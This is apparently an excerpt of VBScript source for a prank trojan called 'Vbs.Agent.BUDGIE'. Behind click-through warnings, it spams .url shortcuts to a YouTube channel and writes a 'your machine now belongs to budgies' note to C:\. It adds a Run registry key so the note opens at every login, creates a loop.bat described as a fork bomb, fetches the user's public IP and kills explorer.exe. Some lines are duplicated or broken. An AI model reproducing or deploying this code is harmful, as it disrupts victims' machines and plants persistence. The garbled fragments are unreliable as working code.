...
response1 = MsgBox(" Run virus? ", 1 + 48, "Vbs.Agent.BUDGIE")   ' 1 = OK/Cancel, 48 = Warning icon
If response1 = 2 Then WScript.Quit 
response2 = MsgBox(" Are you sure about that? ", 1 + 48, "Vbs.Agent.BUDGIE - second warning")   ' 1 = OK/Cancel, 48 = Warning icon
If response2 = 2 Then WScript.Quit 
CreateObject("WScript.Shell").Run "mshta vbscript:MsgBox(""WARNING ITS A TROJAN/PUA THAT SPAMS SHORTCUTS AND WILL ANNOY YOU AND THIS SCRIPT CAN SHUTDOWN YOUR PC IT SHOWS YOUR  IP ADRESS IF YOU CLICK THE HELP BUTTON BE CAUTIOUS ABOUT THE CONSEQUENSES"",vbInformation,""Pua.Vbs/Agent.BUDGIE by benjamin - LAST WARNING"")", 0, False
...
oUrlLink.TargetPath = "https://www.youtube.com/@ADSKer.Official"
oUrlLink.Save
    Set oUrlLink = WshShell.CreateShortcut("NUKEDBYBUDGIE17.url")
oUrlLink.TargetPath = "https://www.youtube.com/@ADSKer.Official"
oUrlLink.Save
    Set oUrlLink = WshShell.CreateShortcut("NUKEDBYBUDGIE18.url")
oUrlLink.TargetPath = "https://www.youtube.com/@ADSKer.Official"
oUrlLink.Save
rlLink.Save
    Set oUrlLink = WshShell.CreateShortcut("NUKEDBYBUDGIE19.url")
oUrlLink.TargetPath = "https://www.youtube.com/@ADSKer.Official"
oUrlLink.Save
rlLink.Save
    Set oUrlLink = WshShell.CreateShortcut("NUKEDBYBUDGIE20.url")
oUrlLink.TargetPath = "https://www.youtube.com/@ADSKer.Official"
oUrlLink.Save
' j.vbs
Randomize
...
Select Case choice
    Case vbAbort
        MsgBox "Deleting"
        Dim objFSO, objFile
sapi.Speak "your pc is now infected with forkbomb.budgie"
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile("loop.bat", True)

Set fso = CreateObject("Scripting.FileSystemObject")
Set msgFile = fso.CreateTextFile("C:\budgie_note.txt", True)
msgFile.WriteLine "your machine now belongs to budgies."
msgFile.WriteLine "Note: your pc now is doomed"
msgFile.WriteLine "budgie:no more coming back"
msgFile.Close

Set shell = CreateObject("WScript.Shell")
shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\budgie_note", "notepad.exe C:\budgie_note.txt", "REG_SZ"
...
objHTTP.Open "GET", "http://v4.ident.me", False
objHTTP.Send

If objHTTP.Status = 200 Then
    MsgBox "i leaked your IP :D is it your ip? " & objHTTP.ResponseText
Else
    MsgBox "Faild" & objHTTP.Status
End If

Set oaaaqqq = CreateObject("WScript.Shell")
oaaaqqq.Run "taskkill /f /im explorer.exe", 0, True
